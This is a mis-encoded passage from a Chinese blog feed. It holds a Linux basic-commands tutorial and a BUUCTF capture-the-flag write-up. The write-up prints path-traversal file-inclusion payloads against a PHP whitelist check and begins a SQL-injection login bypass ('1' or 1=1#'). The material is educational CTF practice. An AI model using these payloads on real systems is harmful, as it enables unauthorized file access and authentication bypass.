aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:/tmp/test/test2<span class="token comment"># rm -i test_file</span>rm: remove regular empty <span class="token function">file</span> <span class="token string">'test_file'</span>? yroot@VM-16-11-debian:/tmp/test/test2<span class="token comment"># ls -l</span>total <span class="token number">0</span>-rw-r--r-- <span class="token number">1</span> root root <span class="token number">0</span> Jan <span class="token number">16</span> <span class="token number">15</span>:35 test_file2-rå‚æ•°åˆ é™¤ç›®å½•ï¼šroot@VM-16-11-debian:/tmp/test<span class="token comment"># rm -r test2</span>root@VM-16-11-debian:/tmp/test<span class="token comment"># tree</span><span class="token builtin class-name">.</span>â”œâ”€â”€ testdirâ”‚   â””â”€â”€ test_file1â””â”€â”€ test_file2<span class="token number">1</span> directory, <span class="token number">2</span> files<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-4-å¤„ç†ç›®å½•"><a href="#2-4-å¤„ç†ç›®å½•" class="headerlink" title="2.4 å¤„ç†ç›®å½•"></a>2.4 å¤„ç†ç›®å½•</h3><h4 id="2-4-1-åˆ›å»ºç›®å½•"><a href="#2-4-1-åˆ›å»ºç›®å½•" class="headerlink" title="2.4.1 åˆ›å»ºç›®å½•"></a>2.4.1 åˆ›å»ºç›®å½•</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">mkdir</span> New_Dir-på‚æ•°ï¼šåŒæ—¶åˆ›å»ºå¤šä¸ªç›®å½•å’Œå­ç›®å½•<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:/tmp/test<span class="token comment"># mkdir -p test2/test3</span>root@VM-16-11-debian:/tmp/test<span class="token comment"># tree</span><span class="token builtin class-name">.</span>â”œâ”€â”€ test2â”‚   â””â”€â”€ test3â”œâ”€â”€ testdirâ”‚   â””â”€â”€ test_file1â””â”€â”€ test_file2<span class="token number">3</span> directories, <span class="token number">2</span> files<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-4-2-åˆ é™¤ç›®å½•"><a href="#2-4-2-åˆ é™¤ç›®å½•" class="headerlink" title="2.4.2 åˆ é™¤ç›®å½•"></a>2.4.2 åˆ é™¤ç›®å½•</h4><p>rmdirå‘½ä»¤<strong>åªåˆ é™¤ç©ºç›®å½•</strong>ã€‚  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">rmdir</span> mydir<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:/tmp/test<span class="token comment"># rmdir test2</span>rmdir: failed to remove <span class="token string">'test2'</span><span class="token builtin class-name">:</span> Directory not empty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="2-5-æŸ¥çœ‹æ–‡ä»¶"><a href="#2-5-æŸ¥çœ‹æ–‡ä»¶" class="headerlink" title="2.5 æŸ¥çœ‹æ–‡ä»¶"></a>2.5 æŸ¥çœ‹æ–‡ä»¶</h3><h4 id="2-5-1-æŸ¥çœ‹æ–‡ä»¶ç±»å‹"><a href="#2-5-1-æŸ¥çœ‹æ–‡ä»¶ç±»å‹" class="headerlink" title="2.5.1  æŸ¥çœ‹æ–‡ä»¶ç±»å‹"></a>2.5.1  æŸ¥çœ‹æ–‡ä»¶ç±»å‹</h4><p>åœ¨æ˜¾ç¤ºæ–‡ä»¶å†…å®¹ä¹‹å‰ï¼Œåº”è¯¥å…ˆäº†è§£ä¸€ä¸‹æ–‡ä»¶çš„ç±»å‹ã€‚å¦‚æœæ‰“å¼€äº†ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä½ ä¼šåœ¨å±å¹•ä¸Šçœ‹åˆ°å„ç§ä¹±ç ï¼Œç”šè‡³ä¼šæŠŠä½ çš„ç»ˆç«¯ä»¿çœŸå™¨æŒ‚èµ·ã€‚  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">file</span> my_file<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:/tmp/test<span class="token comment"># file testdir</span>testdir: directory<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="2-5-2-æŸ¥çœ‹æ•´ä¸ªæ–‡ä»¶"><a href="#2-5-2-æŸ¥çœ‹æ•´ä¸ªæ–‡ä»¶" class="headerlink" title="2.5.2 æŸ¥çœ‹æ•´ä¸ªæ–‡ä»¶"></a>2.5.2 æŸ¥çœ‹æ•´ä¸ªæ–‡ä»¶</h4><p><strong><code>cat &lt;filename&gt;</code> - æ‰“å°æ–‡ä»¶</strong></p><p>è¦å°†æ–‡ä»¶çš„å†…å®¹å¿«é€Ÿè½¬å‚¨åˆ°æ§åˆ¶å°ï¼Œè¯·ä½¿ç”¨<code>cat</code>.</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">cat</span> file1-nå‚æ•°ä¼šç»™æ‰€æœ‰çš„è¡ŒåŠ ä¸Šè¡Œå·ã€‚-bå‚æ•°ä¼šç»™åªæ˜¯æ–‡æœ¬çš„è¡ŒåŠ ä¸Šè¡Œå·ã€‚The quick brown fox jumped over the lazy dog.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong><code>more</code>å‘½ä»¤</strong></p><p><code>cat</code>å‘½ä»¤çš„ä¸»è¦ç¼ºé™·æ˜¯ï¼šä¸€æ—¦è¿è¡Œï¼Œä½ å°±æ— æ³•æ§åˆ¶åé¢çš„æ“ä½œã€‚ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œå¼€å‘äººå‘˜ç¼–å†™äº†<code>more</code>å‘½ä»¤ã€‚ <code>more</code>å‘½ä»¤ä¼šæ˜¾ç¤ºæ–‡æœ¬æ–‡ä»¶çš„å†…å®¹ï¼Œä½†ä¼šåœ¨æ˜¾ç¤ºæ¯é¡µæ•°æ®ä¹‹ååœä¸‹æ¥ã€‚ å¯ä»¥é€šè¿‡æŒ‰ç©ºæ ¼é”®æˆ–å›è½¦é”®ä»¥é€è¡Œå‘å‰çš„æ–¹å¼æµè§ˆæ–‡æœ¬æ–‡ä»¶ã€‚æµè§ˆå®Œä¹‹åï¼ŒæŒ‰qé”®é€€å‡ºã€‚ </p><p><strong><code>less</code>å‘½ä»¤</strong></p><p><strong><code>less &lt;filename&gt;</code> - æ˜¾ç¤ºå’Œæ»šåŠ¨æ–‡ä»¶</strong></p><p><code>less</code>å¦‚æœæ‚¨æƒ³æŸ¥çœ‹ä¸€ä¸ªä¸å®Œå…¨é€‚åˆä¸€ä¸ªå±å¹•çš„é•¿æ–‡ä»¶çš„å†…å®¹ï¼Œè¯¥ç¨‹åºå¾ˆæœ‰ç”¨ã€‚è¦åœ¨è¿è¡Œåé€€å‡ºï¼Œè¯·æŒ‰ <code>q</code>ã€‚</p><p>ä½ å¯ä»¥ç”¨æ›´å°‘çš„æ—¶é—´åšå¾ˆå¤šå…¶ä»–çš„äº‹æƒ…ï¼Œä½†ä¸€ä»¶æœ‰ç”¨çš„äº‹æƒ…æ˜¯èƒ½å¤Ÿæœç´¢ã€‚æ‚¨å¯ä»¥æœç´¢<code>/banana</code>ä»¥æŸ¥æ‰¾æ–‡ä»¶ä¸­â€œé¦™è•‰â€çš„æ‰€æœ‰å®ä¾‹ã€‚</p><h4 id="2-5-3-æŸ¥çœ‹éƒ¨åˆ†æ–‡ä»¶"><a href="#2-5-3-æŸ¥çœ‹éƒ¨åˆ†æ–‡ä»¶" class="headerlink" title="2.5.3 æŸ¥çœ‹éƒ¨åˆ†æ–‡ä»¶"></a>2.5.3 æŸ¥çœ‹éƒ¨åˆ†æ–‡ä»¶</h4><ol><li><p><strong><code>tail</code>å‘½ä»¤</strong><br>tailå‘½ä»¤ä¼šæ˜¾ç¤ºæ–‡ä»¶æœ€åå‡ è¡Œçš„å†…å®¹ï¼ˆæ–‡ä»¶çš„â€œå°¾éƒ¨â€ï¼‰ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œå®ƒä¼šæ˜¾ç¤ºæ–‡ä»¶çš„æœ«å°¾10è¡Œã€‚  å¯ä»¥å‘tailå‘½ä»¤ä¸­åŠ å…¥-nå‚æ•°æ¥ä¿®æ”¹æ‰€æ˜¾ç¤ºçš„è¡Œæ•°:  <code>tail -2 text</code> ã€‚</p></li><li><p><strong><code>head</code>å‘½ä»¤</strong>  </p><p>headå‘½ä»¤ï¼Œé¡¾åæ€ä¹‰ï¼Œä¼šæ˜¾ç¤ºæ–‡ä»¶å¼€å¤´é‚£äº›è¡Œçš„å†…å®¹ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œå®ƒä¼šæ˜¾ç¤ºæ–‡ä»¶å‰10è¡Œçš„æ–‡æœ¬ã€‚åŒç†å¯ä»¥åŠ å…¥ -n å‚æ•°æŒ‡å®šè¡Œæ•°ã€‚ </p></li></ol><hr><p>æœ¬ç« çš„å­¦ä¹ å°±åˆ°è¿™å•¦ï¼Œä¸‹ç« å°†ç»§ç»­è®¨è®ºbash shellçš„å‘½ä»¤ï¼Œå¹¶äº†è§£æ›´å¤šç®¡ç†Linuxç³»ç»Ÿæ—¶ç»å¸¸ç”¨åˆ°çš„é«˜çº§ç³»ç»Ÿç®¡ç†å‘½ä»¤ã€‚  </p><p><font color="#FF9999" size="2">æ–‡ç« å‚è€ƒï¼šLinuxå‘½ä»¤è¡Œä¸shellè„šæœ¬ç¼–ç¨‹å¤§å…¨.ç¬¬2ç‰ˆ by å¸ƒé²å§†ï¼Œå¸ƒé›·æ–¯çº³æ±‰ (z-lib.org)</font></p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/linux2/202201151928218.jpg"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="å­¦ä¹ " scheme="https://huhu-myh.github.io/categories/%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="linux" scheme="https://huhu-myh.github.io/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>buuctfç»ƒä¹ [1-10]</title>
    <link href="https://huhu-myh.github.io/posts/myh10004.html"/>
    <id>https://huhu-myh.github.io/posts/myh10004.html</id>
    <published>2022-01-15T07:03:43.000Z</published>
    <updated>2022-01-19T07:05:03.404Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="1-HCTF-2018-Warmup"><a href="#1-HCTF-2018-Warmup" class="headerlink" title="1.[HCTF 2018]Warmup"></a>1.[HCTF 2018]Warmup</h2><p>è€ƒå¯Ÿï¼šphpå®¡è®¡ï¼šmb_substr()+mb_strpos()ç»•è¿‡</p><p>æ‰“å¼€é¢˜ç›®åœ°å€åå‡ºç°çš„æ˜¯ä¸€ä¸ªæ»‘ç¨½çš„è¡¨æƒ…ï¼Œæ¥ç€æŸ¥çœ‹åŸç å‘ç°æ³¨é‡Šæœ‰ source.php ï¼Œè®¿é—®åå¾—åˆ°ä¸€æ®µæºç ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name">emmm</span>    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$page</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token double-quoted-string string">"source"</span><span class="token operator">=</span><span class="token operator">&gt;</span><span class="token double-quoted-string string">"source.php"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"hint"</span><span class="token operator">=</span><span class="token operator">&gt;</span><span class="token double-quoted-string string">"hint.php"</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">//ç™½åå•</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token double-quoted-string string">"you can't see it"</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>                <span class="token variable">$page</span><span class="token punctuation">,</span>                <span class="token number">0</span><span class="token punctuation">,</span>                <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'?'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'?'</span><span class="token punctuation">)</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>                <span class="token variable">$_page</span><span class="token punctuation">,</span>                <span class="token number">0</span><span class="token punctuation">,</span>                <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$_page</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'?'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'?'</span><span class="token punctuation">)</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">echo</span> <span class="token double-quoted-string string">"you can't see it"</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">&amp;&amp;</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">&amp;&amp;</span> emmm<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment">//éœ€è¦åŒæ—¶æ»¡è¶³ä¸‰ä¸ªæ¡ä»¶ï¼šä¼ å…¥äº†fileå‚æ•°ï¼Œå¹¶ä¸”æ˜¯å­—ç¬¦ä¸²ï¼Œå¹¶ä¸”æ»¡è¶³checkfileå‡½æ•°</span>    <span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">include</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">//æ‰§è¡Œç»™å‡ºçš„fileå‚æ•°å€¼</span>        <span class="token keyword">exit</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token delimiter important">?&gt;</span></span> flag{408cfb51-0d75-4976-9d2e-e431e5d0fd77}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å…ˆæ¥ä»‹ç»ä¸‹ä¸¤ä¸ªå‡½æ•°mb_substr()+mb_strpos()ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">**mb_strpos()**ï¼šè¿”å›è¦æŸ¥æ‰¾çš„å­—ç¬¦ä¸²åœ¨åˆ«ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­é¦–æ¬¡å‡ºç°çš„ä½ç½®    mb_strpos(    string $haystack,    string $needle,):int// haystackï¼šè¦è¢«æ£€æŸ¥çš„å­—ç¬¦ä¸²ã€‚// needleï¼šè¦æœç´¢çš„å­—ç¬¦ä¸²**mb_substr()** å‡½æ•°è¿”å›å­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†ã€‚    mb_substr(    string $str,    int $start,    int $length = NULL,):string//str å¿…éœ€ã€‚ä»è¯¥ string ä¸­æå–å­å­—ç¬¦ä¸²ã€‚//start å¿…éœ€ã€‚è§„å®šåœ¨å­—ç¬¦ä¸²çš„ä½•å¤„å¼€å§‹ã€‚//ength å¯é€‰ã€‚è§„å®šè¦è¿”å›çš„å­—ç¬¦ä¸²é•¿åº¦ã€‚é»˜è®¤æ˜¯ç›´åˆ°å­—ç¬¦ä¸²çš„ç»“å°¾request() //å¯ä»¥ä»¥getæˆ–è€…postæäº¤å‚æ•°include //æ–‡ä»¶åŒ…å«,åŒ…å«å¹¶è¿è¡Œæ–‡ä»¶ä¸­çš„å†…å®¹$_page . '?' //å°†$_pageåæ‹¼æ¥ ? public static function checkFile(&amp;$page)&amp;&amp; emmm::checkFile($_REQUEST['file'])ä¸Šé¢è¿™ä»£ç è¡¨ç¤º å°†requestçš„fileå€¼ ä¼ å…¥$pageï¼Œå…¶å®å°±æ˜¯å°†fileå‚æ•°ä¼ å…¥åˆ°pageä¸­&amp;å¼•ç”¨ä¼ é€’å˜é‡ã€‚è¿™æ˜¯é€šè¿‡åœ¨å‡½æ•°å†…å»ºç«‹ä¸€ä¸ªæœ¬åœ°å˜é‡å¹¶ä¸”è¯¥å˜é‡åœ¨å‘¼å«èŒƒå›´å†…å¼•ç”¨äº†åŒä¸€ä¸ªå†…å®¹æ¥å®ç°çš„ã€‚ä¾‹å¦‚ï¼š <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token keyword">function</span> sub <span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$var</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$var</span><span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">;</span>    <span class="token function">sub</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span>å°†ä½¿ $num å˜æˆ 6ã€‚è¿™æ˜¯å› ä¸ºåœ¨ sub å‡½æ•°ä¸­å˜é‡ $var æŒ‡å‘äº†å’Œ $num æŒ‡å‘çš„åŒä¸€ä¸ªå†…å®¹ã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>â€‹    é€šè¿‡æºç æç¤ºhin.phpï¼Œè®¿é—®ä¹‹åå¾—åˆ°flagåœ¨ffffllllaaaaggggä¸­ï¼Œæ‰€ä»¥æˆ‘ä»¬è‚¯å®šè¦ä½¿includeåŒ…å«è¿™ä¸ªæ–‡ä»¶ï¼Œä»è€Œå¾—åˆ°æˆ‘ä»¬çš„flagã€‚ä½†æ˜¯é€šè¿‡checkfileå‡½æ•°å¯çŸ¥ï¼Œè¿”å›trueçš„æ¡ä»¶æ˜¯æ‰€ä¼ å…¥çš„fileå‚æ•°å€¼ï¼ˆæˆ–è€…æ˜¯ç»è¿‡å‡½æ•°å¤„ç†åçš„å€¼ï¼‰éœ€è¦åœ¨ç™½åå•é‡Œï¼Œæ‰€ä»¥ç›´æ¥ä¼ å…¥ffffllllaaaaggggè‚¯å®šä¸å¾—è¡Œã€‚è¿™æ˜¯æœ€ç»ˆè¦çš„æ¥å•¦ï¼Œ<strong>å°±æ˜¯è€ƒè™‘é¢˜ç›®ç»™çš„å‡½æ•°ï¼Œé€šè¿‡å‡½æ•°çš„å¤„ç†çš„å€¼ä½¿å¾—æˆ‘ä»¬èƒ½å¤Ÿè¿”å›true</strong>ã€‚æ‰€ä»¥æ„é€ payloadä¸ºï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token number">1.</span>file<span class="token operator">=</span>source<span class="token punctuation">.</span>php<span class="token operator">?</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span>ffffllllaaaagggg<span class="token number">2.</span>file<span class="token operator">=</span>source<span class="token punctuation">.</span>php<span class="token operator">%</span><span class="token number">3</span>f<span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span>ffffllllaaaagggg <span class="token comment">//è¿™é‡Œçš„%3fæ˜¯ ? ç»è¿‡ulråŠ å¯†åçš„å€¼ï¼Œç”±äºæ¯æ¬¡ä¼ å‚åï¼Œéƒ½ä¼šè‡ªåŠ¨urldecodeä¸€æ¬¡ï¼Œæ‰€ä»¥ç­‰ä»·äºç¬¬ä¸€ä¸ª</span><span class="token number">3.</span>file<span class="token operator">=</span>source<span class="token punctuation">.</span>php<span class="token operator">%</span><span class="token number">253</span>f<span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span>ffffllllaaaagggg <span class="token comment">//è¿™é‡Œçš„%253fæ˜¯ ? ç»è¿‡ä¸¤æ¬¡ulråŠ å¯†åçš„å€¼ï¼Œåœ¨ç»è¿‡ä¸€æ¬¡è‡ªåŠ¨å¤„ç†ä»¥åŠcheckfileå‡½æ•°é‡Œçš„urldecodeå‡½æ•°å¤„ç†ä¸€æ¬¡åå°±ç­‰ä»·äºç¬¬ä¸€ä¸ªäº†ï¼ŒåŒæ ·å¯ä»¥è¿”å›true</span>    <span class="token comment">//è¯´æ˜ä¸€ä¸‹../æ˜¯è¿”å›ä¸Šä¸€çº§ç›®å½•ï¼Œé¦–å…ˆåœ¨source.php?åŠ ä¸€ä¸ª / ï¼Œä½¿å…¶æˆä¸ºä¸å­˜åœ¨çš„ç›®å½•ï¼Œç„¶å../å°±è¿”å›åˆ°source.phpæ‰€åœ¨çš„ç›®å½•ï¼Œä¹‹åä¸€æ¬¡æ¬¡è¯•åœ¨å“ªä¸ªç›®å½•é‡Œï¼Œè‡ªå·±ä¹Ÿå¯ä»¥åœ¨æœ¬åœ°è¯•è¯•../çš„ç›®å½•å…³ç³»</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¹‹åä¼ å…¥payloadå°±ä¼šå¾—åˆ°flagå•¦~</p><p><strong>å†è¡¥å……ä¸€ä¸‹ ./   ../   / çš„è¯´æ˜ï¼š</strong></p><pre class="line-numbers language-none"><code class="language-none">./ è¡¨ç¤ºå½“å‰ç›®å½•ä¸‹../ è¡¨ç¤ºä¸Šä¸€çº§ç›®å½•/ è¡¨ç¤ºæ ¹ç›®å½•<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201151948708.png" style="zoom:150%;"><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201151948710.png" style="zoom:150%;"><p>å¦‚å›¾ï¼Œä»¥è¿™ä¸ªæ–‡ä»¶å¤¹ä¸ºä¾‹ï¼Œåœ¨buuæ–‡ä»¶ä¸­ï¼Œæœ‰2.pngï¼Œé‚£å°±è¡¨ç¤ºä¸º</p><pre class="line-numbers language-none"><code class="language-none">./buuctfç»ƒä¹ /1.png<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åœ¨æ­¤ç›®å½•ä¸‹ï¼Œæœ‰hello.mdï¼Œé‚£å°±è¡¨ç¤ºä¸ºï¼š</p><pre class="line-numbers language-none"><code class="language-none">./hello.md æˆ–è€… hello.md<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¦‚æœ2.pngåœ¨ä¸Šå±‚ç›®å½•çš„ä¸€ä¸ªimageæ–‡ä»¶ä¸‹ï¼Œé‚£å°±æ˜¯ï¼š</p><pre class="line-numbers language-none"><code class="language-none">../image/1.png<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="2-æå®¢å¤§æŒ‘æˆ˜-2019-EasySQL"><a href="#2-æå®¢å¤§æŒ‘æˆ˜-2019-EasySQL" class="headerlink" title="2.[æå®¢å¤§æŒ‘æˆ˜ 2019]EasySQL"></a>2.[æå®¢å¤§æŒ‘æˆ˜ 2019]EasySQL</h2><p>æ ¹æ®é¢˜ç›®æç¤ºæ˜¯SQLæ³¨å…¥ï¼Œæ‰€ä»¥å…ˆè¯•ç€åˆ¤æ–­æ³¨å…¥ç‚¹å’Œå¼•å·é—­åˆæ–¹å¼ï¼šåœ¨usernameè¾“å…¥ï¼š1â€™ï¼Œå¯†ç éšä¾¿è¾“ï¼š1ï¼Œå‡ºç°è¯­æ³•æŠ¥é”™ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201151948711.png"></p><p>åˆ™å¯ä»¥çŸ¥é“æ˜¯å•å¼•å·é—­åˆï¼Œæ¥ç€å¼€å§‹è¯•è¯•ä¸‡èƒ½å¯†ç ï¼š1â€™ or 1=1#     ,åˆ™è¾“å…¥ååå°è¯­å¥å¤§è‡´å°±æ˜¯ï¼š</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select * from table_name where username='1' or 1=1 # ' and password='1' ;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç”±äº#ä¼šæŠŠåé¢çš„éƒ½æ³¨é‡Šæ‰ï¼Œæ‰€ä»¥å°±ç­‰ä»·äºï¼š</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select * from table_name where username='1' or 1=1<span aria-hidden="true" 